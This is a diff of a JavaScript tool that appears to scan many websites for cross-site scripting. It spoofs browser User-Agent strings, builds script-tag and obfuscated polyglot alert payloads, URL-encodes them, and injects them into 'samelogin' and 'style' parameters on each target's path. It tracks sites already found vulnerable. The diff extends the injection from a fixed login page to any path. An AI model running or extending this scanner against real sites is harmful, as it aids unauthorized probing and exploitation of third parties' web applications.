@@ -85,7 +85,7 @@ function fnDoReq(req,opt,fnCbk)
 {
 	var o = {
 		method: opt.body ? 'POST':'GET',
-		"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; OPPO A33 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043409 Safari/537.36 V1_AND_SQ_7.1.8_718_YYB_D PA QQ/7.1.8.3240 NetType/4G WebP/0.3.0 Pixel/540"
+		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110"
 	};
 	if(opt.body)o["content-type"] = "application/x-www-form-urlencoded";
 	for(var k in opt)
@@ -95,9 +95,10 @@ function fnDoReq(req,opt,fnCbk)
 	
 	var xxUrl = o.uri;delete o.uri;
 	// console.log(o);
+	// console.log(xxUrl)
 	req(xxUrl,o,function(e,r,b)
 	{
-		//console.log(b);
+		// console.log(b);
 		// 非html也会，所以取消检测： && -1 < r.headers['content-type'].indexOf("text/html")
 		if(!e && b)
 		{
@@ -127,7 +128,7 @@ function fnDoCheckUrl(szUrl,fnCbk1)
 	szUrl = szUrl.trim().replace(/[\s\r\n]*/gmi,'');
 	if(g_bSkip && xss_Oks && -1 < xss_Oks.indexOf(szUrl))return;
 	// http://1.1.1.1
-	szUrl = szUrl.substr(0,14) + szUrl.substr(14).replace(/[^\/\.]+\?.*?$/gmi,'');
+	// szUrl = szUrl.substr(0,14) + szUrl.substr(14).replace(/[^\/\.]+\?.*?$/gmi,'');
 	var url = szUrl,szOurl = url, req = fnGetRequest(request),  
 	// new payload 
 		s =  "<" + g_ScrIpt + ">alert(" + new Date().getTime() + ")</" + g_ScrIpt + ">";
@@ -190,9 +191,10 @@ function fnDoCheckUrl(szUrl,fnCbk1)
 	*/
 	s = `\`<>"'%()&+\\`;//'"}alert`12`;if(1){//';// new Function`al\ert\`6\``
 	var sxPay = encodeURIComponent(s);//("null\";</" + g_ScrIpt + ">" + s);
-	
-	url = aH + url + "/login.jsp?samelogin=" + sxPay + "&style=" + sxPay;
-	//console.log(url)
+	var hst = require('url').parse(url);
+	// console.log(hst)
+	url = aH + url + hst.pathname + "?samelogin=" + sxPay + "&style=" + sxPay;
+	// console.log(url)
 	fnDoReq(req,{uri:url},function(b,headers)
 	{
 		if(b)
